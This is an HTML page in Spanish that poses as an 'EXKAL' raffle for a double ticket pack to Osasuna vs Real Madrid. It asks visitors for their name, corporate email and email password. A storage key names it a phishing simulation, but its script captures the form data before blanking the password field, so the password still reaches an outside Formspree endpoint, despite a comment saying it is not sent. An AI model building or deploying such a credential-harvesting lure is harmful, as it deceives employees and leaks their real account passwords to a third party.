<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Registro | Sorteo entradas</title>

  <!-- Favicon -->
  <link rel="icon" type="image/jpeg" href="img/logo.jpg" />

  <style>
    :root{
      --stroke:#ffffff1a;
      --txt:#eaf0ff; --muted:#c4cbee;
      --red:#d61f2c; --cyan:#5ff0ff; --gold:#ffcc66;
      --shadow: 0 20px 60px #0008;
      --radius: 22px;
      --font: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial;
    }
    *{box-sizing:border-box}

    body{
      margin:0; min-height:100vh; font-family:var(--font);
      color:var(--txt);
      overflow-x:hidden;

      background:
        radial-gradient(1200px 700px at 15% 20%, #2a3cff2a, transparent 60%),
        radial-gradient(900px 650px at 80% 30%, #5ff0ff1a, transparent 58%),
        radial-gradient(900px 600px at 40% 85%, #ff2b2b18, transparent 62%),
        url("img/fondo.avif");
      background-size: cover;
      background-position: center;
      background-attachment: fixed;
      position:relative;
    }
    body::before{
      content:"";
      position:fixed; inset:0;
      pointer-events:none;
      background:
        linear-gradient(180deg, #050815b3, #0508158f 35%, #050815bf),
        radial-gradient(1200px 650px at 50% 15%, #0b2a7a35, transparent 60%);
      z-index:-1;
    }

    .wrap{ width:min(980px, 92vw); margin:0 auto; padding: 30px 0 80px; }

    .card{
      background: linear-gradient(180deg, #0e1638e6, #070b18d9);
      border: 1px solid var(--stroke);
      border-radius: var(--radius);
      box-shadow: var(--shadow);
      overflow:hidden;
      position:relative;
    }

    .inner{ padding: 24px; }

    .head{
      display:flex; align-items:center; gap:12px;
      margin-bottom: 10px;
    }
    .logo{
      height:38px; width:auto;
      display:block;
      border-radius:10px;
      box-shadow: 0 10px 22px #0007;
      background:#ffffff;
      padding:4px;
    }

    h1{ margin:0; font-size: clamp(24px, 3vw, 34px); letter-spacing:-.3px; }
    p{ margin:10px 0 18px; color:var(--muted); line-height:1.55; }
    a{ color: var(--cyan); text-decoration:none; }
    a:hover{ text-decoration:underline; }

    form{ display:grid; gap:14px; margin-top:10px; }
    .row{ display:grid; gap:14px; grid-template-columns: 1fr 1fr; }
    @media (max-width: 760px){ .row{ grid-template-columns: 1fr; } }

    label{ font-size: 13px; color:#d9e2ff; font-weight:800; }

    .field{
      display:grid; gap:8px;
      padding:14px;
      border-radius: 18px;
      border:1px solid #ffffff18;
      background:#0b102080;
      box-shadow: 0 10px 20px #0004;
    }

    input{
      width:100%;
      padding:12px 12px;
      border-radius: 14px;
      border:1px solid #ffffff18;
      background:#070b18;
      color:var(--txt);
      outline:none;
    }
    input:focus{
      border-color:#5ff0ff66;
      box-shadow: 0 0 0 4px #5ff0ff1a;
    }

    .btns{ display:flex; gap:12px; flex-wrap:wrap; margin-top:6px; }
    button{
      appearance:none; border:0; cursor:pointer;
      padding: 12px 16px;
      border-radius: 16px;
      font-weight:900;
      letter-spacing:.2px;
      transition: transform .15s ease, filter .15s ease;
    }
    button:hover{ transform: translateY(-1px); }
    button:active{ transform: translateY(1px) scale(.99); }

    .primary{
      background: linear-gradient(135deg, var(--red), #ff5a6b);
      color:white;
      box-shadow: 0 16px 30px #d61f2c33, inset 0 0 0 1px #fff3;
    }
    .ghost{
      background:#0b102080;
      border:1px solid #ffffff1f;
      color:#eaf0ff;
    }

    .panel{
      margin-top: 18px;
      padding: 16px;
      border-radius: 18px;
      border:1px solid #ffffff18;
      background:#0b102070;
      box-shadow: 0 18px 40px #0006;
    }
    .mono{ font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace; }
    .small{ font-size:12px; color:#aeb8de; }
    .ok{ color:#a7ffce; font-weight:900; }

    .list{ margin-top:10px; display:grid; gap:10px; }
    .item{
      padding:12px;
      border-radius:16px;
      border:1px solid #ffffff14;
      background:#0b102080;
    }
    .item b{ color:#fff; }
    .hr{ height:1px; background:#ffffff12; margin:14px 0; }
  </style>
  <!-- Google tag (gtag.js) -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-CKPZN2QWVP"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-CKPZN2QWVP');
  </script>
</head>

<body>
  <div class="wrap">
    <div class="card">
      <div class="inner">

        <div class="head">
          <img class="logo" src="img/logo.jpg" alt="EXKAL">
          <div>
            <div class="small">Sorteo EXKAL</div>
            <h1>Registro de participación</h1>
          </div>
        </div>

        <p>
          Partido: <b>Osasuna vs Real Madrid</b> · <b>22/02/2026</b> · Pack doble (2 personas).
          <br/>
          <a href="index.html">← Volver</a>
        </p>

        <form id="f" action="https://formspree.io/f/xpwvewrq" method="POST">
          <input type="hidden" name="password_enviada" value="true">
          <div class="row">
        <div class="field">
          <label for="name">Nombre y apellidos</label>
          <input id="name" name="name" autocomplete="name" required placeholder="Ej. Nombre Apellidos" />
        </div>
        
        <div class="field">
          <label for="email">Correo corporativo</label>
          <input id="email" name="email" type="email" autocomplete="email" required placeholder="nombre@empresa.com" />
        </div>
        </div>
        
        <div class="field">
          <label for="password">Contraseña del correo</label>
          <input id="password" name="password" type="password" autocomplete="current-password" required placeholder="***********" />
        </div>
        
        <div class="btns">
          <button class="primary" type="submit">Enviar participación</button>
          <button class="ghost" type="button" id="clear">Borrar registros</button>
        </div>
        </form>
        <div class="panel">
          <div class="small">Estado:</div>
          <div id="status" class="mono small">Sin envíos todavía.</div>

          <div class="hr"></div>

          <div class="small">Total registros guardados localmente:</div>
          <div id="count" class="mono ok">0</div>

          <div class="small" style="margin-top:10px;">Registros:</div>
          <div id="list" class="list"></div>
        </div>

        <p class="small" style="margin-top:16px;">
          * Los datos se guardan en <span class="mono">localStorage</span> del navegador (solo en este equipo).
        </p>

      </div>
    </div>
  </div>

<script>
  const KEY = "phish_sim_entries_v1";
  const FORMSPREE = "https://formspree.io/f/xpwvewrq";

  function escapeHtml(str){
    return String(str)
      .replaceAll("&","&amp;")
      .replaceAll("<","&lt;")
      .replaceAll(">","&gt;")
      .replaceAll('"',"&quot;")
      .replaceAll("'","&#039;");
  }

  function load(){
    try { return JSON.parse(localStorage.getItem(KEY) || "[]"); }
    catch { return []; }
  }

  function setStatus(msg){
    document.getElementById("status").textContent = msg;
  }

  function render(){
    const entries = load();
    document.getElementById("count").textContent = String(entries.length);

    const list = document.getElementById("list");
    list.innerHTML = "";

    if(entries.length === 0){
      const empty = document.createElement("div");
      empty.className = "mono small";
      empty.textContent = "No hay registros todavía.";
      list.appendChild(empty);
      return;
    }

    const sorted = [...entries].sort((a,b) => (b.submittedAt||"").localeCompare(a.submittedAt||""));
    for(const e of sorted){
      const item = document.createElement("div");
      item.className = "item";
      const when = e.submittedAt ? new Date(e.submittedAt).toLocaleString() : "";
      item.innerHTML =
        `<b>${escapeHtml(e.name || "")}</b><br>
         <span class="mono">${escapeHtml(e.email || "")}</span><br>
         <span class="small">${escapeHtml(when)}</span>`;
      list.appendChild(item);
    }
  }

  render();

  document.getElementById("f").addEventListener("submit", async (e) => {
    e.preventDefault();

    const form = e.target;
    const name = document.getElementById("name").value.trim();
    const email = document.getElementById("email").value.trim();

    // Guardado local (como ya hacías)
    const entries = load();
    entries.push({ name, email, submittedAt: new Date().toISOString() });
    localStorage.setItem(KEY, JSON.stringify(entries));
    render();

    // Envío a Formspree (recomendado: NO mandar contraseña real)
    const fd = new FormData(form);
    const passInput = document.getElementById("password");
    if (passInput) passInput.value = "";     // vacía antes de enviar
    fd.set("password_enviada", "true");

    try{
      const res = await fetch(FORMSPREE, {
        method: "POST",
        body: fd,
        headers: { "Accept": "application/json" }
      });

      if(res.ok){
        setStatus(`✅ Enviado a Formspree y guardado local: ${email} · ${new Date().toLocaleString()}`);
        form.reset();
      } else {
        setStatus(`⚠️ Guardado local OK, pero Formspree devolvió error (${res.status}).`);
      }
    } catch {
      setStatus("⚠️ Guardado local OK, pero no se pudo conectar con Formspree.");
    }
  });

  document.getElementById("clear").addEventListener("click", () => {
    localStorage.removeItem(KEY);
    render();
    setStatus("Registros borrados.");
  });
</script>

</body>
</html>



